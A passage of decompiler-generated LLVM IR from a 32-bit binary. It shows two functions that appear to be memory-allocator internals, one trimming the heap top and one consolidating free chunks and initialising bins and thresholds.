  uselistorder i32 %v1_804ffb9, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804fa909, { 1, 0, 2 }
  uselistorder i32 %v3_804f96f, { 1, 0, 2 }
  uselistorder i32 %v2_804f961, { 2, 1, 0 }
  uselistorder i1 %v6_804f95b, { 1, 0, 2 }
  uselistorder i32 %v2_804f93c, { 2, 1, 0 }
  uselistorder i8 %v0_804f90a, { 2, 1, 3, 0, 4 }
  uselistorder i32 %.v1_804f903, { 30, 12, 31, 2, 14, 32, 3, 21, 22, 33, 34, 4, 19, 20, 23, 25, 24, 5, 18, 17, 6, 16, 15, 28, 7, 27, 26, 35, 13, 29, 0, 11, 9, 10, 1, 8 }
  uselistorder i32 %v1_804f8f3, { 0, 2, 1 }
  uselistorder i32 %v0_804f8dc, { 1, 0 }
  uselistorder i32 %v2_804f8c3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 16, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 22, 21, 23, 24, 28, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 51, 49, 50, 52 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 21, 1, 2, 3, 4, 5, 6, 7, 8, 18, 9, 19, 10, 11, 12, 13, 14, 20, 0, 22, 23, 24, 15, 16, 17 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 62, 63, 64, 66, 65, 67, 68, 69, 70, 71, 72, 73, 57, 58, 59, 60, 61 }
  uselistorder i32 (i32)* @function_8050259, { 1, 3, 2, 0 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_805b8a0.71, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8051110, { 1, 0 }
  uselistorder i32 (i32)* @function_804f8ae, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 134591860, { 1, 3, 0, 2 }
  uselistorder i32* @global_var_805b580.59, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_804f888, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805b56c.56 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805b56c.56 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 -32, { 0, 4, 3, 2, 1, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_8050018, { 1, 0 }
  uselistorder label %dec_label_pc_8050007, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804fffa, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804fff6, { 1, 0 }
  uselistorder label %dec_label_pc_804ffec, { 1, 0 }
  uselistorder label %dec_label_pc_804ff97, { 1, 0 }
  uselistorder label %dec_label_pc_804ff6e, { 1, 0 }
  uselistorder label %dec_label_pc_804ff5b, { 1, 0 }
  uselistorder label %dec_label_pc_804ff49, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804fedb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fed6, { 1, 0 }
  uselistorder label %dec_label_pc_804fe63, { 1, 0 }
  uselistorder label %dec_label_pc_804fe4c, { 1, 0 }
  uselistorder label %dec_label_pc_804fe35, { 1, 0 }
  uselistorder label %dec_label_pc_804fdb8, { 1, 0 }
  uselistorder label %dec_label_pc_804fdab, { 1, 0 }
  uselistorder label %dec_label_pc_804fd6c, { 1, 0 }
  uselistorder label %dec_label_pc_804fd45, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804fd29, { 1, 0 }
  uselistorder label %dec_label_pc_804fd10, { 1, 0 }
  uselistorder label %dec_label_pc_804fcf2, { 1, 0 }
  uselistorder label %dec_label_pc_804fc0d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fc05, { 1, 0 }
  uselistorder label %dec_label_pc_804fbee, { 1, 0 }
  uselistorder label %dec_label_pc_804fb81, { 1, 0 }
  uselistorder label %dec_label_pc_804fb86.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804fb5a, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fae1, { 1, 0 }
  uselistorder label %dec_label_pc_804fa90, { 1, 0 }
  uselistorder label %dec_label_pc_804fa68, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804fa51, { 1, 0 }
  uselistorder label %dec_label_pc_804f9bf, { 1, 0 }
  uselistorder label %dec_label_pc_804fa90.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f98c, { 1, 0, 3, 2 }
}

define i32 @function_8050024() local_unnamed_addr {
dec_label_pc_8050024:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_805002b = load i32, i32* @edx, align 4
  store i32 %v0_805002b, i32* %ebp.global-to-local, align 4
  %v1_805002d = add i32 %v0_805002b, 860
  %v2_805002d = inttoptr i32 %v1_805002d to i32*
  %v3_805002d = load i32, i32* %v2_805002d, align 4
  store i32 %v3_805002d, i32* %ecx.global-to-local, align 4
  %v1_8050033 = add i32 %v0_805002b, 44
  %v2_8050033 = inttoptr i32 %v1_8050033 to i32*
  %v3_8050033 = load i32, i32* %v2_8050033, align 4
  %v1_8050036 = add i32 %v3_8050033, 4
  %v2_8050036 = inttoptr i32 %v1_8050036 to i32*
  %v3_8050036 = load i32, i32* %v2_8050036, align 4
  %v1_8050039 = and i32 %v3_8050036, -4
  store i32 %v1_8050039, i32* @esi, align 4
  %v1_805003e = load i32, i32* @eax, align 4
  %v2_805003e = add i32 %v3_805002d, -17
  %v2_8050040 = add i32 %v2_805003e, %v1_8050039
  %v3_8050040 = sub i32 %v2_8050040, %v1_805003e
  %div = udiv i32 %v3_8050040, %v3_805002d
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_8050048 = add i32 %div, -1
  %v4_805004b = mul i32 %v1_8050048, %v3_805002d
  store i32 %v4_805004b, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_805004b, 1
  br i1 %tmp11, label %dec_label_pc_80500a9, label %dec_label_pc_8050052

dec_label_pc_8050052:                             ; preds = %dec_label_pc_8050024
  %v1_8050057 = call i32 @function_8051324(i32 0)
  store i32 %v1_8050057, i32* %edi.global-to-local, align 4
  %v0_805005e = load i32, i32* @esi, align 4
  store i32 %v0_805005e, i32* %eax.global-to-local, align 4
  %v1_8050060 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050060 = add i32 %v1_8050060, 44
  %v3_8050060 = inttoptr i32 %v2_8050060 to i32*
  %v4_8050060 = load i32, i32* %v3_8050060, align 4
  %v5_8050060 = add i32 %v4_8050060, %v0_805005e
  store i32 %v5_8050060, i32* %eax.global-to-local, align 4
  %v12_8050066 = icmp eq i32 %v1_8050057, %v5_8050060
  %v1_8050068 = icmp eq i1 %v12_8050066, false
  br i1 %v1_8050068, label %dec_label_pc_80500a9, label %dec_label_pc_805006a

dec_label_pc_805006a:                             ; preds = %dec_label_pc_8050052
  %v1_805006d = sub i32 0, %v4_805004b
  store i32 %v1_805006d, i32* @ebx, align 4
  %v1_8050070 = call i32 @function_8051324(i32 %v1_805006d)
  store i32 %v1_8050070, i32* %eax.global-to-local, align 4
  %v1_805007c = call i32 @function_8051324(i32 0)
  store i32 %v1_805007c, i32* %eax.global-to-local, align 4
  %v10_8050084 = icmp eq i32 %v1_805007c, -1
  br i1 %v10_8050084, label %dec_label_pc_80500a9, label %dec_label_pc_8050089

dec_label_pc_8050089:                             ; preds = %dec_label_pc_805006a
  %v0_8050089 = load i32, i32* %edi.global-to-local, align 4
  %v2_805008b = sub i32 %v0_8050089, %v1_805007c
  %v12_805008b = icmp eq i32 %v2_805008b, 0
  store i32 %v2_805008b, i32* %ecx.global-to-local, align 4
  br i1 %v12_805008b, label %dec_label_pc_80500a9, label %dec_label_pc_805008f

dec_label_pc_805008f:                             ; preds = %dec_label_pc_8050089
  %v0_805008f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805008f = add i32 %v0_805008f, 44
  %v2_805008f = inttoptr i32 %v1_805008f to i32*
  %v3_805008f = load i32, i32* %v2_805008f, align 4
  store i32 %v3_805008f, i32* %eax.global-to-local, align 4
  %v1_8050092 = add i32 %v0_805008f, 872
  %v2_8050092 = inttoptr i32 %v1_8050092 to i32*
  %v3_8050092 = load i32, i32* %v2_8050092, align 4
  %v5_8050092 = sub i32 %v3_8050092, %v2_805008b
  store i32 %v5_8050092, i32* %v2_8050092, align 4
  %v0_8050098 = load i32, i32* @esi, align 4
  %v1_8050098 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050098 = sub i32 %v0_8050098, %v1_8050098
  %v1_805009a = or i32 %v2_8050098, 1
  %v1_805009d = load i32, i32* %eax.global-to-local, align 4
  %v2_805009d = add i32 %v1_805009d, 4
  %v3_805009d = inttoptr i32 %v2_805009d to i32*
  store i32 %v1_805009a, i32* %v3_805009d, align 4
  br label %dec_label_pc_80500a9

dec_label_pc_80500a9:                             ; preds = %dec_label_pc_8050024, %dec_label_pc_8050052, %dec_label_pc_805006a, %dec_label_pc_8050089, %dec_label_pc_805008f
  %storemerge = phi i32 [ 1, %dec_label_pc_805008f ], [ 0, %dec_label_pc_8050089 ], [ 0, %dec_label_pc_805006a ], [ 0, %dec_label_pc_8050052 ], [ 0, %dec_label_pc_8050024 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805007c, { 1, 0, 2 }
  uselistorder i32 %v4_805004b, { 1, 2, 0 }
  uselistorder i32 %v3_805002d, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8051324, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80500a9, { 4, 3, 2, 1, 0 }
}

define i32 @function_80500b1(i32* %arg1) local_unnamed_addr {
dec_label_pc_80500b1:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_80500b2 = load i32, i32* @edi, align 4
  %v0_80500b3 = load i32, i32* @esi, align 4
  %v0_80500b4 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80500bc = load i32, i32* %arg1, align 4
  store i32 %v2_80500bc, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80500c3 = icmp eq i32 %v2_80500bc, 0
  br i1 %v1_80500c3, label %dec_label_pc_80501dd.lr.ph, label %dec_label_pc_80500cb

dec_label_pc_80501dd.lr.ph:                       ; preds = %dec_label_pc_80500b1
  %v3_80501e1 = add i32 %tmp20, 44
  br label %dec_label_pc_80501dd

dec_label_pc_80500cb:                             ; preds = %dec_label_pc_80500b1
  %v1_80500cf = and i32 %v2_80500bc, -3
  store i32 %v1_80500cf, i32* %arg1, align 4
  %v1_80500d4 = add i32 %tmp20, 52
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_80500f0 = udiv i32 %v1_80500cf, 8
  %v2_80500f3 = mul nuw i32 %v2_80500f0, 4
  %v3_80500f3 = add i32 %tmp20, -4
  %v4_80500f3 = add i32 %v3_80500f3, %v2_80500f3
  store i32 %v4_80500f3, i32* %eax.global-to-local, align 4
  %v2_80501ba = add i32 %tmp20, 44
  %v3_80501ba = inttoptr i32 %v2_80501ba to i32*
  %v1_805018d = add i32 %tmp20, 60
  %v2_805018d = inttoptr i32 %v1_805018d to i32*
  br label %dec_label_pc_80500fb

dec_label_pc_80500fb:                             ; preds = %dec_label_pc_80501c9, %dec_label_pc_80500cb
  %v0_8050109.in = phi i32 [ %tmp20, %dec_label_pc_80500cb ], [ %v0_8050109, %dec_label_pc_80501c9 ]
  %v0_8050109 = add i32 %v0_8050109.in, 4
  store i32 %v0_8050109, i32* %eax.global-to-local, align 4
  %v1_80500ff = inttoptr i32 %v0_8050109 to i32*
  %v2_80500ff = load i32, i32* %v1_80500ff, align 4
  store i32 %v2_80500ff, i32* @ecx, align 4
  %v1_8050101 = icmp eq i32 %v2_80500ff, 0
  br i1 %v1_8050101, label %dec_label_pc_80501c9, label %dec_label_pc_8050109

dec_label_pc_8050109:                             ; preds = %dec_label_pc_80500fb
  store i32 0, i32* %v1_80500ff, align 4
  %v0_805010f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805010f

dec_label_pc_805010f:                             ; preds = %dec_label_pc_80501bd, %dec_label_pc_8050109
  %v0_805012c = phi i32 [ %v3_805010f, %dec_label_pc_80501bd ], [ %v0_805010f.pre, %dec_label_pc_8050109 ]
  %v1_805010f = add i32 %v0_805012c, 8
  %v2_805010f = inttoptr i32 %v1_805010f to i32*
  %v3_805010f = load i32, i32* %v2_805010f, align 4
  store i32 %v3_805010f, i32* %edx.global-to-local, align 4
  %v1_8050116 = add i32 %v0_805012c, 4
  %v2_8050116 = inttoptr i32 %v1_8050116 to i32*
  %v3_8050116 = load i32, i32* %v2_8050116, align 4
  store i32 %v3_8050116, i32* %eax.global-to-local, align 4
  %v1_805011b = and i32 %v3_8050116, -2
  store i32 %v1_805011b, i32* @edi, align 4
  %v2_805011e = urem i32 %v3_8050116, 2
  %v3_805011e = icmp eq i32 %v2_805011e, 0
  %v2_8050120 = add i32 %v1_805011b, %v0_805012c
  store i32 %v2_8050120, i32* @ebx, align 4
  %v1_8050123 = add i32 %v2_8050120, 4
  %v2_8050123 = inttoptr i32 %v1_8050123 to i32*
  %v3_8050123 = load i32, i32* %v2_8050123, align 4
  store i32 %v3_8050123, i32* %edx.global-to-local, align 4
  %v1_805012a = icmp eq i1 %v3_805011e, false
  br i1 %v1_805012a, label %dec_label_pc_805014c, label %dec_label_pc_805012c

dec_label_pc_805012c:                             ; preds = %dec_label_pc_805010f
  %v1_805012c = inttoptr i32 %v0_805012c to i32*
  %v2_805012c = load i32, i32* %v1_805012c, align 4
  store i32 %v2_805012c, i32* %ebp.global-to-local, align 4
  %v2_8050130 = sub i32 %v0_805012c, %v2_805012c
  store i32 %v2_8050130, i32* %eax.global-to-local, align 4
  %v1_8050132 = add i32 %v2_8050130, 8
  %v2_8050132 = inttoptr i32 %v1_8050132 to i32*
  %v3_8050132 = load i32, i32* %v2_8050132, align 4
  store i32 %v3_8050132, i32* @esi, align 4
  %v1_8050135 = add i32 %v2_8050130, 12
  %v2_8050135 = inttoptr i32 %v1_8050135 to i32*
  %v3_8050135 = load i32, i32* %v2_8050135, align 4
  store i32 %v3_8050135, i32* %edx.global-to-local, align 4
  %v1_8050138 = add i32 %v3_8050132, 12
  %v2_8050138 = inttoptr i32 %v1_8050138 to i32*
  %v3_8050138 = load i32, i32* %v2_8050138, align 4
  store i32 %v3_8050138, i32* @ecx, align 4
  %v12_805013b = icmp eq i32 %v3_8050138, %v2_8050130
  %v1_805013d = icmp eq i1 %v12_805013b, false
  br i1 %v1_805013d, label %dec_label_pc_805017c, label %dec_label_pc_805013f

dec_label_pc_805013f:                             ; preds = %dec_label_pc_805012c
  %v1_805013f = add i32 %v3_8050135, 8
  %v2_805013f = inttoptr i32 %v1_805013f to i32*
  %v3_805013f = load i32, i32* %v2_805013f, align 4
  %v15_805013f = icmp eq i32 %v3_805013f, %v3_8050138
  %v1_8050142 = icmp eq i1 %v15_805013f, false
  br i1 %v1_8050142, label %dec_label_pc_805017c, label %dec_label_pc_8050144

dec_label_pc_8050144:                             ; preds = %dec_label_pc_805013f
  %v2_8050144 = add i32 %v2_805012c, %v1_805011b
  store i32 %v2_8050144, i32* @edi, align 4
  store i32 %v3_8050135, i32* %v2_8050138, align 4
  %v0_8050149 = load i32, i32* @esi, align 4
  %v1_8050149 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050149 = add i32 %v1_8050149, 8
  %v3_8050149 = inttoptr i32 %v2_8050149 to i32*
  store i32 %v0_8050149, i32* %v3_8050149, align 4
  %v0_8050157.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805014c

dec_label_pc_805014c:                             ; preds = %dec_label_pc_805010f, %dec_label_pc_8050144
  %v1_8050160 = phi i32 [ %v2_8050120, %dec_label_pc_805010f ], [ %v0_8050157.pre, %dec_label_pc_8050144 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8050154 = and i32 %v3_8050123, -4
  store i32 %v1_8050154, i32* %ebp.global-to-local, align 4
  %v4_8050157 = load i32, i32* %v3_80501ba, align 4
  %v15_8050157 = icmp eq i32 %v1_8050160, %v4_8050157
  br i1 %v15_8050157, label %dec_label_pc_80501ad, label %dec_label_pc_805015c

dec_label_pc_805015c:                             ; preds = %dec_label_pc_805014c
  %v2_805015c = add i32 %v1_8050160, 4
  %v3_805015c = add i32 %v2_805015c, %v1_8050154
  %v4_805015c = inttoptr i32 %v3_805015c to i32*
  %v5_805015c = load i32, i32* %v4_805015c, align 4
  store i32 %v5_805015c, i32* %eax.global-to-local, align 4
  %v3_8050160 = inttoptr i32 %v2_805015c to i32*
  store i32 %v1_8050154, i32* %v3_8050160, align 4
  %v0_8050163 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050163 = urem i32 %v0_8050163, 2
  %v2_8050163 = icmp eq i32 %v1_8050163, 0
  store i32 %v1_8050163, i32* %eax.global-to-local, align 4
  %v1_8050168 = icmp eq i1 %v2_8050163, false
  br i1 %v1_8050168, label %dec_label_pc_8050189, label %dec_label_pc_805016a

dec_label_pc_805016a:                             ; preds = %dec_label_pc_805015c
  %v0_805016a = load i32, i32* @ebx, align 4
  %v1_805016a = add i32 %v0_805016a, 8
  %v2_805016a = inttoptr i32 %v1_805016a to i32*
  %v3_805016a = load i32, i32* %v2_805016a, align 4
  store i32 %v3_805016a, i32* @edx, align 4
  %v1_805016d = add i32 %v0_805016a, 12
  %v2_805016d = inttoptr i32 %v1_805016d to i32*
  %v3_805016d = load i32, i32* %v2_805016d, align 4
  store i32 %v3_805016d, i32* %eax.global-to-local, align 4
  %v1_8050170 = add i32 %v3_805016a, 12
  %v2_8050170 = inttoptr i32 %v1_8050170 to i32*
  %v3_8050170 = load i32, i32* %v2_8050170, align 4
  store i32 %v3_8050170, i32* @esi, align 4
  %v12_8050173 = icmp eq i32 %v3_8050170, %v0_805016a
  %v1_8050175 = icmp eq i1 %v12_8050173, false
  br i1 %v1_8050175, label %dec_label_pc_805017c, label %dec_label_pc_8050177

dec_label_pc_8050177:                             ; preds = %dec_label_pc_805016a
  %v1_8050177 = add i32 %v3_805016d, 8
  %v2_8050177 = inttoptr i32 %v1_8050177 to i32*
  %v3_8050177 = load i32, i32* %v2_8050177, align 4
  %v15_8050177 = icmp eq i32 %v3_8050177, %v3_8050170
  br i1 %v15_8050177, label %dec_label_pc_8050181, label %dec_label_pc_805017c

dec_label_pc_805017c:                             ; preds = %dec_label_pc_8050177, %dec_label_pc_805016a, %dec_label_pc_805013f, %dec_label_pc_805012c
  %v0_805017c = call i32 @function_8050418()
  store i32 %v0_805017c, i32* %eax.global-to-local, align 4
  %v1_8050183.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050181

dec_label_pc_8050181:                             ; preds = %dec_label_pc_8050177, %dec_label_pc_805017c
  %v1_8050183 = phi i32 [ %v3_805016a, %dec_label_pc_8050177 ], [ %v1_8050183.pre, %dec_label_pc_805017c ]
  %v0_8050183 = phi i32 [ %v3_805016d, %dec_label_pc_8050177 ], [ %v0_805017c, %dec_label_pc_805017c ]
  %v0_8050181 = load i32, i32* @edi, align 4
  %v1_8050181 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050181 = add i32 %v1_8050181, %v0_8050181
  store i32 %v2_8050181, i32* @edi, align 4
  %v2_8050183 = add i32 %v1_8050183, 12
  %v3_8050183 = inttoptr i32 %v2_8050183 to i32*
  store i32 %v0_8050183, i32* %v3_8050183, align 4
  %v0_8050186 = load i32, i32* @edx, align 4
  %v1_8050186 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050186 = add i32 %v1_8050186, 8
  %v3_8050186 = inttoptr i32 %v2_8050186 to i32*
  store i32 %v0_8050186, i32* %v3_8050186, align 4
  br label %dec_label_pc_8050189

dec_label_pc_8050189:                             ; preds = %dec_label_pc_805015c, %dec_label_pc_8050181
  store i32 %v1_80500d4, i32* %eax.global-to-local, align 4
  %v3_805018d = load i32, i32* %v2_805018d, align 4
  store i32 %v3_805018d, i32* %edx.global-to-local, align 4
  %v0_8050190 = load i32, i32* @ecx, align 4
  store i32 %v0_8050190, i32* %v2_805018d, align 4
  %v0_8050193 = load i32, i32* @edi, align 4
  %v1_8050195 = or i32 %v0_8050193, 1
  store i32 %v1_8050195, i32* %eax.global-to-local, align 4
  %v0_8050198 = load i32, i32* @ecx, align 4
  %v1_8050198 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050198 = add i32 %v1_8050198, 12
  %v3_8050198 = inttoptr i32 %v2_8050198 to i32*
  store i32 %v0_8050198, i32* %v3_8050198, align 4
  %v0_805019b = load i32, i32* %eax.global-to-local, align 4
  %v1_805019b = load i32, i32* @ecx, align 4
  %v2_805019b = add i32 %v1_805019b, 4
  %v3_805019b = inttoptr i32 %v2_805019b to i32*
  store i32 %v0_805019b, i32* %v3_805019b, align 4
  store i32 %v1_80500d4, i32* %eax.global-to-local, align 4
  %v0_80501a2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80501a2 = load i32, i32* @ecx, align 4
  %v2_80501a2 = add i32 %v1_80501a2, 8
  %v3_80501a2 = inttoptr i32 %v2_80501a2 to i32*
  store i32 %v0_80501a2, i32* %v3_80501a2, align 4
  %v0_80501a5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80501a5 = load i32, i32* @ecx, align 4
  %v2_80501a5 = add i32 %v1_80501a5, 12
  %v3_80501a5 = inttoptr i32 %v2_80501a5 to i32*
  store i32 %v0_80501a5, i32* %v3_80501a5, align 4
  %v0_80501a8 = load i32, i32* @edi, align 4
  %v1_80501a8 = load i32, i32* @ecx, align 4
  %v3_80501a8 = add i32 %v1_80501a8, %v0_80501a8
  %v4_80501a8 = inttoptr i32 %v3_80501a8 to i32*
  store i32 %v0_80501a8, i32* %v4_80501a8, align 4
  br label %dec_label_pc_80501bd

dec_label_pc_80501ad:                             ; preds = %dec_label_pc_805014c
  %v0_80501ad = load i32, i32* @edi, align 4
  %v2_80501ad = add i32 %v0_80501ad, %v1_8050154
  %v1_80501b0 = or i32 %v2_80501ad, 1
  store i32 %v1_80501b0, i32* %eax.global-to-local, align 4
  %v1_80501b3 = load i32, i32* @ecx, align 4
  %v2_80501b3 = add i32 %v1_80501b3, 4
  %v3_80501b3 = inttoptr i32 %v2_80501b3 to i32*
  store i32 %v1_80501b0, i32* %v3_80501b3, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v0_80501ba = load i32, i32* @ecx, align 4
  store i32 %v0_80501ba, i32* %v3_80501ba, align 4
  br label %dec_label_pc_80501bd

dec_label_pc_80501bd:                             ; preds = %dec_label_pc_8050189, %dec_label_pc_80501ad
  store i32 %v3_805010f, i32* @ecx, align 4
  %v1_80501c1 = icmp eq i32 %v3_805010f, 0
  %v1_80501c3 = icmp eq i1 %v1_80501c1, false
  br i1 %v1_80501c3, label %dec_label_pc_805010f, label %dec_label_pc_80501c9

dec_label_pc_80501c9:                             ; preds = %dec_label_pc_80501bd, %dec_label_pc_80500fb
  %v15_80501cd = icmp eq i32 %v0_8050109, %v4_80500f3
  br i1 %v15_80501cd, label %dec_label_pc_8050251, label %dec_label_pc_80500fb

dec_label_pc_80501dd:                             ; preds = %dec_label_pc_80501dd.lr.ph, %dec_label_pc_80501dd
  %v1_80501e1 = phi i32 [ 1, %dec_label_pc_80501dd.lr.ph ], [ %v0_80501ec, %dec_label_pc_80501dd ]
  %v2_80501e1 = mul i32 %v1_80501e1, 8
  %v4_80501e1 = add i32 %v3_80501e1, %v2_80501e1
  store i32 %v4_80501e1, i32* %eax.global-to-local, align 4
  %v1_80501e5 = add i32 %v1_80501e1, 1
  store i32 %v1_80501e5, i32* %edx.global-to-local, align 4
  %v2_80501e6 = add i32 %v4_80501e1, 12
  %v3_80501e6 = inttoptr i32 %v2_80501e6 to i32*
  store i32 %v4_80501e1, i32* %v3_80501e6, align 4
  %v0_80501e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80501e9 = add i32 %v0_80501e9, 8
  %v3_80501e9 = inttoptr i32 %v2_80501e9 to i32*
  store i32 %v0_80501e9, i32* %v3_80501e9, align 4
  %v0_80501ec = load i32, i32* %edx.global-to-local, align 4
  %v7_80501ef = icmp sgt i32 %v0_80501ec, 95
  br i1 %v7_80501ef, label %dec_label_pc_80501f1, label %dec_label_pc_80501dd

dec_label_pc_80501f1:                             ; preds = %dec_label_pc_80501dd
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80501f5 = add i32 %tmp20, 864
  %v2_80501f5 = inttoptr i32 %v1_80501f5 to i32*
  %v3_80501f5 = load i32, i32* %v2_80501f5, align 4
  %v4_80501f5 = or i32 %v3_80501f5, 1
  store i32 %v4_80501f5, i32* %v2_80501f5, align 4
  %v0_80501fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80501fc = add i32 %v0_80501fc, 840
  %v2_80501fc = inttoptr i32 %v1_80501fc to i32*
  store i32 0, i32* %v2_80501fc, align 4
  %v0_8050206 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050206 = add i32 %v0_8050206, 852
  %v2_8050206 = inttoptr i32 %v1_8050206 to i32*
  store i32 65536, i32* %v2_8050206, align 4
  %v0_8050210 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050210 = add i32 %v0_8050210, 844
  %v2_8050210 = inttoptr i32 %v1_8050210 to i32*
  store i32 262144, i32* %v2_8050210, align 4
  %v0_805021a = load i32, i32* %eax.global-to-local, align 4
  %v1_805021a = add i32 %v0_805021a, 836
  %v2_805021a = inttoptr i32 %v1_805021a to i32*
  store i32 262144, i32* %v2_805021a, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_805022b = load i32, i32* %arg1, align 4
  %v1_805022d = urem i32 %v2_805022b, 4
  %v1_8050230 = or i32 %v1_805022d, 72
  store i32 %v1_8050230, i32* %arg1, align 4
  %v1_8050237 = add i32 %tmp20, 52
  store i32 %v1_8050237, i32* %eax.global-to-local, align 4
  %v2_805023a = add i32 %tmp20, 44
  %v3_805023a = inttoptr i32 %v2_805023a to i32*
  store i32 %v1_8050237, i32* %v3_805023a, align 4
  %v1_805023f = call i32 @function_8050c58(i32 30)
  store i32 %v1_805023f, i32* %eax.global-to-local, align 4
  %v2_805024b = add i32 %tmp20, 860
  %v3_805024b = inttoptr i32 %v2_805024b to i32*
  store i32 %v1_805023f, i32* %v3_805024b, align 4
  br label %dec_label_pc_8050251

dec_label_pc_8050251:                             ; preds = %dec_label_pc_80501c9, %dec_label_pc_80501f1
  store i32 %v0_80500b4, i32* @ebx, align 4
  store i32 %v0_80500b3, i32* @esi, align 4
  store i32 %v0_80500b2, i32* @edi, align 4
  %v0_8050258 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8050258

; uselistorder directives
  uselistorder i32 %v0_80501ec, { 1, 0 }
  uselistorder i32 %v0_80501e9, { 1, 0 }
  uselistorder i32 %v1_80501e1, { 1, 0 }
  uselistorder i32 %v0_80501a8, { 1, 0 }
  uselistorder i32 %v1_8050163, { 1, 0 }
  uselistorder i32 %v2_805015c, { 1, 0 }
  uselistorder i32 %v1_8050154, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050160, { 1, 0 }
  uselistorder i32 %v3_805010f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_805012c, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8050109, { 2, 0, 1, 3 }
  uselistorder i32* %v3_80501ba, { 1, 0 }
  uselistorder i32 %v1_80500d4, { 1, 0 }
  uselistorder i32 %tmp20, { 6, 1, 0, 15, 13, 12, 10, 9, 2, 4, 11, 5, 8, 3, 14, 7 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 (i32)* @function_8050c58, { 1, 0 }
  uselistorder i32 -2, { 7, 8, 0, 2, 1, 4, 5, 3, 6 }
  uselistorder i32 -3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050251, { 1, 0 }
